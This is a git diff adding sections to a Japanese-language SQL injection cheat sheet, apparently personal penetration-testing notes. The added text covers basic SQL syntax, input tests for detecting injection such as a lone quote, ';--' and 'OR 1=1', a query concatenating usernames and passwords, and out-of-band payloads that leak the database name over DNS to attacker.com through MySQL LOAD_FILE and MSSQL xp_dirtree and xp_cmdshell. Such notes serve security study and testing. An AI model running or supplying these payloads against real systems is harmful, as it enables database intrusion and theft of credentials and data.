@@ -1,5 +1,47 @@
 # SQL インジェクション
 
+## 基礎
+
+### 構文
+
+コメント
+
+```sql
+SELECT * FROM users WHERE username='admin'-- AND password='secret';
+```
+
+UNION
+
+```sql
+SELECT name, age FROM students UNION SELECT username, id FROM admins;
+```
+
+LILE
+
+```sql
+SELECT * FROM users WHERE username LIKE 'adm%';
+```
+
+LIMIT
+
+```sql
+SELECT * FROM users LIMIT 1;       -- returns only the first row
+SELECT * FROM users LIMIT 2, 1;    -- skips 2 rows, returns the 3rd
+```
+
+group_concat
+
+```sql
+SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
+```
+
+### 基本的な検出
+
+- シングルクォテーション入力。エラーを返す場合、おそらく適切なSQL処理が行われていない。
+- ダブルクォテーション入力。シングルの代わりに使われている場合もある。
+- `;--` 入力。動作が変わる場合、コメントが処理されている。
+- `OR 1=1`。入力がクエリのロジックに直接影響している。
+
 ## Error Based SQLi
 
 画面で Select している列数を探る
@@ -166,6 +208,22 @@ a' UNION SELECT sleep(5),2 from users where username='admin' and password like '
 https://www.exploit-db.com/exploits/46635
 
 ## 帯域外 SQLi
+
+### DNS
+
+```sql
+-- MySQL
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
+
+-- MSSQL
+-- xp_cmdshell は最新のMSSQLではデフォルトで無効だが、xp_dirtree は依然として利用可能
+DECLARE @db VARCHAR(100);
+SELECT @db = DB_NAME();
+
+EXEC master..xp_dirtree '\\' + @db + '.attacker.com\share';
+-- or
+EXEC xp_cmdshell 'nslookup' + @db + '.attacker.com';
+```
 
 ### ファイル出力
 
